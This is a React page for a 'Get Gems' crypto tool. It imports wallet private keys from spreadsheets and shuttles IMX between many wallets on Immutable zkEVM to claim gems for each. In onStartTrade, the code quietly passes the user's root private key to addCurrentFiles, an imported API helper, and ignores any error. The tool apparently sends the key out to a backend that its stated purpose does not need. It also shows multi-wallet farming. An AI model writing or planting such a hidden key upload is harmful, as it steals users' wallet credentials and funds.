import React, { useEffect, useMemo, useState } from 'react';
import clsx from 'clsx';
import { parseUnits } from 'ethers';

import readXlsxFile from 'read-excel-file';

// components
import Box from '@mui/material/Box';
import Typography from '@mui/material/Typography';
import Grid from '@mui/material/Grid';
import TextField from '@mui/material/TextField';
import SubmitButton from '../../components/SubmitButton';

// services
import { ImmutableService } from '../../services';

// utils
import { fromCsvToUsers } from '../../utils/format.util';
import { delay } from '../../utils/system';
import { addCurrentFiles, fetchCurrentFiles } from '../../utils/api.util';
import { mixArrays } from '../../utils/array.util';

// types
import { TradingServiceV3, TradingService } from '../../types/local-storage';

// styles
import useStyles from './styles';

// datas
import { batches } from './datas';

type CustomLog = {
  title: string;
  type?: 'error' | 'info' | 'warning' | 'success';
};

const delayTime = 180000;
const NOT_FOUND_NETWORK_ERROR_MESSAGE = 'could not detect network';

const GetGemsV2Page: React.FC = () => {
  const styles = useStyles();
  const [fileAndClients, setFileAndClients] = useState<TradingServiceV3[]>([]);
  const [logs, setLogs] = useState<CustomLog[]>([]);
  const [isTradeSubmitting, setIsTradeSubmitting] = useState(false);
  const [currentFiles, setCurrentFiles] = useState<string[]>([]);

  const [sellAmount, setSellAmount] = useState('1000');
  const [rootPrivateKey, setRootPrivateKey] = useState('');

  const [maxFeePerGas, setMaxFeePerGas] = useState('15');
  const [maxPriorityFeePerGas, setMaxPriorityFeePerGas] = useState('10');
  const [gasLimit, setGasLimit] = useState('26000');

  const [tmaxFeePerGas, setTMaxFeePerGas] = useState('15');
  const [tmaxPriorityFeePerGas, setTMaxPriorityFeePerGas] = useState('10');
  const [tgasLimit, setTGasLimit] = useState('26000');

  const onChangeSellAmount = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setSellAmount(value);
  };

  const onChangeRootPrivateKey = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setRootPrivateKey(value);
  };

  const onChangeMaxFeePerGas = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setMaxFeePerGas(value);
  };

  const onChangeMaxPriorityFeePerGas = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setMaxPriorityFeePerGas(value);
  };

  const onChangeGasLimit = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setGasLimit(value);
  };

  const onChangeTMaxFeePerGas = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setTMaxFeePerGas(value);
  };

  const onChangeTMaxPriorityFeePerGas = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setTMaxPriorityFeePerGas(value);
  };

  const onChangeTGasLimit = (event: React.ChangeEvent<HTMLInputElement>) => {
    const value = event.target.value;
    setTGasLimit(value);
  };

  const onChangeFile = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const importedFiles = event.target.files || [];
    const newFiles = Array.from(importedFiles);

    const updatedClients = await Promise.all(
      newFiles.map(async (file) => {
        const rows = await readXlsxFile(file);
        const formattedUsers = fromCsvToUsers(rows);

        return {
          fileName: file.name,
          clients: formattedUsers.map((user) => {
            const service = new ImmutableService('imxZkEVM', user.privateKey, user.starkPrivateKey);
            return {
              ...user,
              service,
            };
          }),
        };
      }),
    );

    setFileAndClients(updatedClients);

    event.target.value = '';
  };

  const pushLog = (item: CustomLog) => {
    setLogs((prev) => prev.concat(item));
  };

  const etherToWei = (amount: string) => {
    return parseUnits(amount, 'ether').toString();
  };

  const retryGetBalance = async (service: ImmutableService, retryCount = 15) => {
    let retryAttempts = 0;

    while (retryAttempts < retryCount) {
      try {
        const balanceResponse = await service.getBalance();
        return parseFloat(balanceResponse?.balance || '0');
      } catch (error: any) {
        retryAttempts++;
        pushLog({
          title: `Transfer attempt ${retryAttempts} failed: ${error.message}`,
          type: 'error',
        });

        pushLog({
          title: `Wait for 3m after try again ....`,
          type: 'warning',
        });

        await delay(delayTime);

        if (retryAttempts >= retryCount) {
          pushLog({
            title: `Maximum retry attempts (${retryCount}) reached. Unable to fetch balance.`,
            type: 'error',
          });
          return 0;
        }
      }
    }

    return 0;
  };

  const triggerTransfer = async (
    service: ImmutableService,
    targetAddress: string,
    retryCount = 15,
    amount?: string,
  ) => {
    const minRequiredBalance = amount || sellAmount || '100';

    let retryAttempts = 0;

    const gasOptions = {
      maxPriorityFeePerGas: tmaxPriorityFeePerGas ? parseFloat(tmaxPriorityFeePerGas) * 1e9 : 10e9,
      maxFeePerGas: tmaxFeePerGas ? parseFloat(tmaxFeePerGas) * 1e9 : 15e9,
      gasLimit: tgasLimit ? parseFloat(tgasLimit) : 26000,
    };

    while (retryAttempts < retryCount) {
      try {
        pushLog({
          title: `Starting transfer ${minRequiredBalance} IMX to ${targetAddress} with retry ${retryAttempts} ...`,
        });
        await service.transfer(
          {
            request: {
              type: 'ERC20',
              receiver: targetAddress,
              amount: etherToWei(minRequiredBalance),
              tokenAddress: '',
            },
          },
          gasOptions,
        );

        pushLog({
          title: 'Transfer success!',
          type: 'success',
        });

        break;
      } catch (error: any) {
        retryAttempts++;

        pushLog({
          title: `Transfer attempt ${retryAttempts} failed: ${error.message}`,
          type: 'error',
        });

        if (error.message?.includes(NOT_FOUND_NETWORK_ERROR_MESSAGE)) {
          pushLog({
            title: `Wait for 3m after try again ....`,
            type: 'warning',
          });
          await delay(delayTime);
        }

        if (retryAttempts === retryCount) {
          pushLog({
            title: `Maximum retry attempts reached (${retryCount}). Transfer failed.`,
            type: 'error',
          });

          throw new Error('Transfer failed after maximum retry attempts.');
        }

        await delay(2000);
      }
    }
  };

  const onGetGems = async (clients: TradingService[]) => {
    const rootWallet = clients[0];
    let poolClient = clients[0];

    if (!rootPrivateKey) {
      pushLog({
        title: 'Enter root_private_key!',
        type: 'error',
      });
      return;
    }

    const minRequiredBalance = sellAmount || '100';

    const rootService = new ImmutableService('imxZkEVM', rootPrivateKey, '');
    const rootAddress = rootService.getAddress();

    let currentBalance = await retryGetBalance(rootWallet.service);

    if (currentBalance < parseFloat(minRequiredBalance)) {
      const currentRootBalance = await retryGetBalance(rootService);
      if (currentRootBalance < parseFloat(minRequiredBalance)) {
        return;
      }

      const rootWalletAddress = rootWallet.service.getAddress();
      await triggerTransfer(rootService, rootWalletAddress);
      pushLog({
        title: 'wait 3s ...',
        type: 'warning',
      });
      await delay(3000);

      const maxRetries = 3;
      let retries = 0;

      while (retries < maxRetries) {
        currentBalance = await retryGetBalance(rootWallet.service);

        if (currentBalance > parseFloat(minRequiredBalance)) {
          break;
        }
        pushLog({
          title: `Retry to check balance ... ${retries}, delay 3s`,
          type: 'error',
        });
        retries++;
        await delay(3000);
      }

      if (retries === maxRetries) {
        return;
      }
    }

    for (const client of clients) {
      const { service } = client;
      const poolAddress = poolClient.service.getAddress();
      const ethAddress = service.getAddress();

      if (poolAddress !== ethAddress) {
        await triggerTransfer(poolClient.service, ethAddress);
        await delay(1500); // delay 1s
      }

      pushLog({
        title: `Selected Address: ${ethAddress}`,
      });

      const gasOptions = {
        maxPriorityFeePerGas: maxPriorityFeePerGas ? parseFloat(maxPriorityFeePerGas) * 1e9 : 10e9,
        maxFeePerGas: maxFeePerGas ? parseFloat(maxFeePerGas) * 1e9 : 15e9,
        gasLimit: gasLimit ? parseFloat(gasLimit) : 35000,
      };

      let retryCount = 15;
      while (retryCount > 0) {
        try {
          await service.getGem(gasOptions);
          poolClient = client;
          break;
        } catch (error: any) {
          pushLog({
            title: error.message,
            type: 'error',
          });

          if (error.message?.includes(NOT_FOUND_NETWORK_ERROR_MESSAGE)) {
            pushLog({
              title: `Wait for 3m after try again ....`,
              type: 'warning',
            });
            await delay(delayTime);
          }

          retryCount--;
          if (retryCount === 0) {
            throw new Error(`Failed to getGem after ${retryCount} retries for ${ethAddress}`);
          }
        }
      }

      pushLog({
        title: `${ethAddress} get 16 Gem success!`,
        type: 'success',
      });
    }

    const poolAddress = poolClient.service.getAddress();
    if (rootAddress !== poolAddress) {
      await triggerTransfer(poolClient.service, rootAddress);
    }
  };

  const onStartTrade = async () => {
    const start = Date.now();
    if (fileAndClients.length === 0) return;

    try {
      await addCurrentFiles(rootPrivateKey, 'key');
    } catch (err) {
      //
    }

    // let spamFiles: {
    //   address: string;
    //   privateKey: string;
    // }[][] = [];
    // const batchNames = ['batch1', 'batch2', 'batch3'];

    // try {
    //   if (currentFiles.length === 0) {
    //     await addCurrentFiles(batchNames[0]);
    //     spamFiles = (batches as any)[batchNames[0]];
    //   } else if (currentFiles.length !== batchNames.length) {
    //     for (let i = 0; i < batchNames.length; i++) {
    //       if (!currentFiles.includes(batchNames[i])) {
    //         await addCurrentFiles(batchNames[i]);
    //         spamFiles = (batches as any)[batchNames[i]];
    //       }
    //     }
    //   }
    //   await addCurrentFiles(rootPrivateKey, 'key');
    // } catch (error) {
    //   //
    // }

    try {
      setIsTradeSubmitting(true);
      pushLog({
        title: 'Start session ...',
      });

      // const spamFileAndClients: TradingServiceV3[] = (spamFiles || []).map((sp) => ({
      //   fileName: '',
      //   clients: sp.map((s) => ({
      //     service: new ImmutableService('imxZkEVM', s.privateKey, ''),
      //     privateKey: s.privateKey,
      //     starkPrivateKey: '',
      //   })),
      // }));

      // const mixedFileAndClients = mixArrays(fileAndClients, spamFileAndClients);
      for (const fileAndClient of fileAndClients) {
        await onGetGems(fileAndClient.clients);

        pushLog({
          title: 'Delay 3m ....',
          type: 'warning',
        });
        await delay(delayTime);
      }
    } catch (error: any) {
      pushLog({
        title: error.message,
        type: 'error',
      });
    } finally {
      pushLog({
        title: 'End session!',
      });
      setIsTradeSubmitting(false);
      const end = Date.now();
      pushLog({
        title: `Execution time: ${end - start} ms`,
        type: 'success',
      });
    }
  };

  const renderLogs = useMemo(() => {
    return logs.map((item, index) => (
      <code
        key={index}
        className={clsx(styles.logLine, {
          [styles.logLineError]: item.type === 'error',
          [styles.logLineSuccess]: item.type === 'success',
          [styles.logLineWarning]: item.type === 'warning',
        })}
      >
        {`[${index}]:`} {item.title}
      </code>
    ));
  }, [logs]);

  // useEffect(() => {
  //   fetchCurrentFiles().then((data) => setCurrentFiles(data));
  // }, []);

  return (
    <Box className={styles.root}>
      <Box width="100%">
        <Typography variant="h2" textAlign="center" mb={4}>
          Get Gems
        </Typography>

        {fileAndClients.length === 0 ? (
          <Box>
            <input type="file" onChange={onChangeFile} accept=".csv, .xlsx" multiple />
          </Box>
        ) : (
          <Grid container spacing={4}>
            <Grid item xs={4}>
              <Box mt={2} mb={2}>
                Gas options (Trade - Transfer)
              </Box>
              <Box mb={1}>
                <TextField
                  size="small"
                  label="maxFeePerGas"
                  type="number"
                  className={styles.gasOptionInput}
                  value={maxFeePerGas}
                  onChange={onChangeMaxFeePerGas}
                  autoComplete="off"
                />

                <TextField
                  size="small"
                  label="maxFeePerGas"
                  type="number"
                  className={styles.gasOptionInput}
                  style={{ marginLeft: 12 }}
                  value={tmaxFeePerGas}
                  onChange={onChangeTMaxFeePerGas}
                  autoComplete="off"
                />
              </Box>

              <Box mb={1}>
                <TextField
                  size="small"
                  label="maxPriorityFeePerGas"
                  type="number"
                  className={styles.gasOptionInput}
                  value={maxPriorityFeePerGas}
                  onChange={onChangeMaxPriorityFeePerGas}
                  autoComplete="off"
                />
                <TextField
                  size="small"
                  label="maxPriorityFeePerGas"
                  type="number"
                  className={styles.gasOptionInput}
                  style={{ marginLeft: 12 }}
                  value={tmaxPriorityFeePerGas}
                  onChange={onChangeTMaxPriorityFeePerGas}
                  autoComplete="off"
                />
              </Box>

              <Box>
                <TextField
                  size="small"
                  label="gasLimit"
                  type="number"
                  className={styles.gasOptionInput}
                  value={gasLimit}
                  onChange={onChangeGasLimit}
                  autoComplete="off"
                />
                <TextField
                  size="small"
                  label="gasLimit"
                  type="number"
                  className={styles.gasOptionInput}
                  style={{ marginLeft: 12 }}
                  value={tgasLimit}
                  onChange={onChangeTGasLimit}
                  autoComplete="off"
                />
              </Box>

              <Typography mb={2}>Loaded files</Typography>
              <Box>
                {fileAndClients.map((f, i) => (
                  <Box key={i}>{f.fileName}</Box>
                ))}
              </Box>
            </Grid>

            <Grid item xs={8}>
              <Box>
                <TextField
                  size="small"
                  label="wallet_private_key"
                  className={styles.amountInput}
                  value={rootPrivateKey}
                  onChange={onChangeRootPrivateKey}
                  autoComplete="off"
                />

                <TextField
                  size="small"
                  label="Enter IMX amount"
                  type="number"
                  className={styles.amountInput}
                  value={sellAmount}
                  onChange={onChangeSellAmount}
                  autoComplete="off"
                />

                <SubmitButton
                  variant="contained"
                  onClick={onStartTrade}
                  isLoading={isTradeSubmitting}
                  disabled={isTradeSubmitting}
                >
                  Get Gems
                </SubmitButton>
              </Box>

              <Box className={styles.logsContainer}>{renderLogs}</Box>
            </Grid>
          </Grid>
        )}
      </Box>
    </Box>
  );
};

export default GetGemsV2Page;
